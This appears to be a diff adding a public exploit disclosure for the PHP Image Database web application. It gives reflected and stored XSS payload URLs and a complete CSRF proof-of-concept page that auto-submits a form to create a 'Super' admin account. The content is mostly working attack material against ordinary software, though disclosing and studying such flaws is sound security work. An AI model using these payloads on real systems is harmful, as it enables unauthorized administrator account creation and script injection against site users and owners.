@@ -1,0 +1,75 @@
+# Exploit Title: PHP Image Database - Multiple Vulnerabilities
+# Date: 2016-10-16
+# Exploit Author: larrycompress
+# Contact: larrycompress@gmail.com
+# Type: webapps
+# Platform: PHP
+# Vendor Homepage: http://www.pagereactions.com/product.php?pku=3
+# Software Link: http://www.pagereactions.com/downloads/phpimagedatabase.zip
+----------------------------------------------------------------------------
+
+POC as follows :
+
+# 0x00 Reflected XSS
+
+---
+
+1.In public search :
+
+http://192.168.1.112/phpimagedatabase/index.php?dateyear=<svg/onload=alert(1)>&key=<svg/onload=alert(2)>
+
+2.In administration web interface (need normal user login) :
+
+http://192.168.1.112/phpimagedatabase/administration.php?dateyear=<svg/onload=alert(1)>&key=<svg/onload=alert(2)>
+
+
+# 0x01 Stored XSS
+
+---
+
+1.In administration web images interface (need normal user login) :
+
+http://192.168.1.112/phpimagedatabase/administration.php
+?pageaction=newimage
+&MAX_FILE_SIZE=1000000
+&subaction=submit
+&dateday=16
+&datemonthnewedit=10
+&dateyearnewedit=2016
+&title=<svg/onload=alert(1)>
+&caption=<svg/onload=alert(2)>
+&keywordtags=<svg/onload=alert(3)>
+&photographer=<svg/onload=alert(4)>
+&categorynewedit=
+&publish=active
+
+2.In administration web categories interface (need  administrator user login) :
+
+http://192.168.1.112/phpimagedatabase/administration.php?pageaction=newcategory&subaction=submit&categoryname=</select><svg/onload=alert(1)><select>
+
+# 0x02 CSRF (add Super user)
+
+---
+
+In http://192.168.1.103/csrf.html :
+
+<!DOCTYPE html>
+<html>
+  <body>
+    <form action="http://192.168.1.112/phpimagedatabase/administration.php" method="POST">
+      <input name="pageaction" value="saveuser" type="hidden" />
+      <input name="subaction" value="submit" type="hidden" />
+      <input name="username" value="larry_csrf" type="hidden" />
+      <input name="password" value="larry_csrf" type="hidden" />
+      <input name="userfullname" value="larry_csrf" type="hidden" />
+      <input name="accesslevel" value="Super" type="hidden" />
+      <input name="userstatus" value="active" type="hidden" />
+      <input name="mysubmit" value="submit" type="submit" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+
+* Thanks to Besim *
